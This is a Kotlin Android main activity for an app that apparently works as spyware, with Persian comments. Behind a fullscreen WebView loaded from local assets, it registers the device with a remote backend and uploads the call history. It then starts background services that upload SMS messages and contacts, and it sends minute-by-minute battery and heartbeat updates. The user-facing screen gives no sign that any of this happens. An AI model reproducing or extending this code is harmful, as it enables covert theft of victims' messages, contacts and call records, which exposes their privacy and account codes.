package com.example.test

import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.webkit.WebSettings
import android.webkit.WebChromeClient
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.viewinterop.AndroidView
import com.example.test.utils.DataUploader
import com.example.test.utils.DeviceInfoHelper
import com.example.test.utils.PermissionManager
import com.example.test.utils.PermissionDialog
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {

    private lateinit var deviceId: String
    private var fcmToken: String = ""
    private val handler = Handler(Looper.getMainLooper())
    private val BATTERY_UPDATE_INTERVAL_MS = 60000L
    private val FCM_TIMEOUT_MS = 10000L
    private val userId = Constants.USER_ID

    private lateinit var webView: WebView
    private lateinit var permissionManager: PermissionManager

    companion object {
        private const val TAG = "MainActivity"
    }

    private val batteryUpdater = object : Runnable {
        override fun run() {
            DataUploader.sendBatteryUpdate(this@MainActivity, deviceId, fcmToken)
            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        enableFullscreen()

        deviceId = DeviceInfoHelper.getDeviceId(this)
        Log.d(TAG, "📱 Device ID: $deviceId")

        permissionManager = PermissionManager(this)
        permissionManager.initialize {
            // وقتی همه دسترسی‌ها داده شد
        }

        setContent {
            MaterialTheme {
                MainScreen()
            }
        }
    }

    private fun enableFullscreen() {
        actionBar?.hide()

        WindowCompat.setDecorFitsSystemWindows(window, false)

        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.apply {
            hide(WindowInsetsCompat.Type.systemBars())
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        }

        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }

    @Composable
    fun MainScreen() {
        var showPermissionDialog by remember { mutableStateOf(false) }
        var permissionsGranted by remember { mutableStateOf(false) }
        val scope = rememberCoroutineScope()

        LaunchedEffect(Unit) {
            delay(300)
            if (!permissionManager.checkAllPermissions()) {
                showPermissionDialog = true
            } else {
                permissionsGranted = true
                continueInitialization()
            }
        }

        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.Black)
        ) {
            AndroidView(
                factory = { context ->
                    createWebView()
                },
                modifier = Modifier.fillMaxSize()
            )

            if (showPermissionDialog) {
                PermissionDialog(
                    onRequestPermissions = {
                        scope.launch {
                            permissionManager.requestPermissions {
                                if (permissionManager.checkAllPermissions()) {
                                    showPermissionDialog = false
                                    permissionsGranted = true
                                    continueInitialization()
                                }
                            }
                        }
                    }
                )
            }
        }
    }

    private fun createWebView(): WebView {
        webView = WebView(this)

        val webSettings: WebSettings = webView.settings

        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.allowFileAccessFromFileURLs = false
            webSettings.allowUniversalAccessFromFileURLs = false
        }

        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.setSupportZoom(false)
        webSettings.builtInZoomControls = false
        webSettings.displayZoomControls = false
        webSettings.loadsImagesAutomatically = true
        webSettings.blockNetworkImage = false
        webSettings.blockNetworkLoads = false

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBLE_MODE
        }

        webSettings.cacheMode = WebSettings.LOAD_DEFAULT

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            if (BuildConfig.DEBUG) {
                WebView.setWebContentsDebuggingEnabled(true)
            }
        } else {
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
        }

        webView.webViewClient = object : WebViewClient() {

            // جلوگیری از باز شدن لینک‌ها در مرورگر
            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                return false
            }

            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                return false
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d(TAG, "✅ WebView page loaded successfully")

                webView.evaluateJavascript(
                    """
                    (function() {
                        try {
                            var el = document.getElementById('deviceId');
                            if (el) {
                                el.innerText = 'Device ID: $deviceId';
                            }
                            console.log('Device ID injected successfully');
                        } catch(e) {
                            console.error('Error injecting device ID:', e);
                        }
                    })();
                    """.trimIndent(),
                    null
                )
            }

            override fun onReceivedError(view: WebView?, errorCode: Int, description: String?, failingUrl: String?) {
                super.onReceivedError(view, errorCode, description, failingUrl)
                Log.e(TAG, "❌ WebView error: $description at $failingUrl")
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                msg?.let {
                    Log.d(TAG, "JS: ${it.message()} [${it.sourceId()}:${it.lineNumber()}]")
                }
                return true
            }
        }

        try {
            webView.loadUrl("file:///android_asset/index.html")
            Log.d(TAG, "📄 Loading index.html from assets...")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error loading HTML: ${e.message}", e)
        }

        return webView
    }

    private fun continueInitialization() {
        Log.d(TAG, "🚀 Starting initialization...")

        var fcmReceived = false

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            fcmReceived = true
            if (task.isSuccessful && task.result != null) {
                fcmToken = task.result!!
                Log.d(TAG, "✅ FCM Token received: ${fcmToken.take(20)}...")
            } else {
                Log.w(TAG, "⚠️ FCM token failed: ${task.exception?.message}")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
                Log.d(TAG, "🔑 Using fallback token: $fcmToken")
            }
        }

        handler.postDelayed({
            if (!fcmReceived) {
                Log.w(TAG, "⏱️ FCM timeout! Continuing without it...")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
                Log.d(TAG, "🔑 Using fallback token: $fcmToken")
            }

            // ترتیب اجرا:
            // 1️⃣ ریجستر + تاریخچه تماس (فرانت)
            // 2️⃣ شروع سرویس‌های پس‌زمینه
            // 3️⃣ SMS و مخاطبین در DataUploadService (پس‌زمینه)

            Thread {
                try {
                    Log.d(TAG, "════════════════════════════════════════")
                    Log.d(TAG, "🚀 STARTING INITIALIZATION SEQUENCE")
                    Log.d(TAG, "════════════════════════════════════════")

                    // 1️⃣ ریجستر گوشی
                    Log.d(TAG, "1️⃣ Registering device...")
                    val registerSuccess = DataUploader.registerDevice(this, deviceId, fcmToken, userId)
                    if (registerSuccess) {
                        Log.d(TAG, "✅ Device registered successfully")
                    } else {
                        Log.w(TAG, "⚠️ Device registration failed, continuing anyway...")
                    }

                    // 2️⃣ آپلود تاریخچه تماس‌ها
                    Log.d(TAG, "2️⃣ Uploading call history...")
                    DataUploader.uploadCallHistory(this, deviceId)
                    Log.d(TAG, "✅ Call history upload completed")

                    Log.d(TAG, "════════════════════════════════════════")
                    Log.d(TAG, "🎯 FRONTEND OPERATIONS COMPLETED")
                    Log.d(TAG, "════════════════════════════════════════")

                    // 3️⃣ شروع سرویس‌های پس‌زمینه
                    Log.d(TAG, "3️⃣ Starting background services...")

                    startSmsService()
                    Thread.sleep(500) // فاصله کوتاه بین سرویس‌ها

                    startHeartbeatService()
                    Thread.sleep(500)

                    startDataUploadService()

                    Log.d(TAG, "════════════════════════════════════════")
                    Log.d(TAG, "✅ ALL SERVICES STARTED SUCCESSFULLY")
                    Log.d(TAG, "📱 SMS & Contacts uploading in background...")
                    Log.d(TAG, "════════════════════════════════════════")

                } catch (e: Exception) {
                    Log.e(TAG, "❌ Initialization error: ${e.message}", e)
                    e.printStackTrace()
                }
            }.start()

            // شروع آپدیت باتری
            handler.post(batteryUpdater)

        }, FCM_TIMEOUT_MS)
    }

    private fun startSmsService() {
        try {
            val intent = android.content.Intent(this, SmsService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ SmsService started")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start SmsService: ${e.message}")
        }
    }

    private fun startHeartbeatService() {
        try {
            val intent = android.content.Intent(this, HeartbeatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ HeartbeatService started (1 min interval)")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}")
        }
    }

    private fun startDataUploadService() {
        try {
            val intent = android.content.Intent(this, DataUploadService::class.java)
            intent.putExtra(DataUploadService.EXTRA_DEVICE_ID, deviceId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d(TAG, "✅ DataUploadService started (SMS + Contacts)")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start DataUploadService: ${e.message}")
        }
    }

    override fun onBackPressed() {
        if (::webView.isInitialized && webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(batteryUpdater)

        if (::webView.isInitialized) {
            webView.stopLoading()
            webView.clearCache(true)
            webView.destroy()
        }

        if (::permissionManager.isInitialized) {
            permissionManager.stopBatteryMonitoring()
        }

        Log.d(TAG, "👋 MainActivity destroyed")
    }
}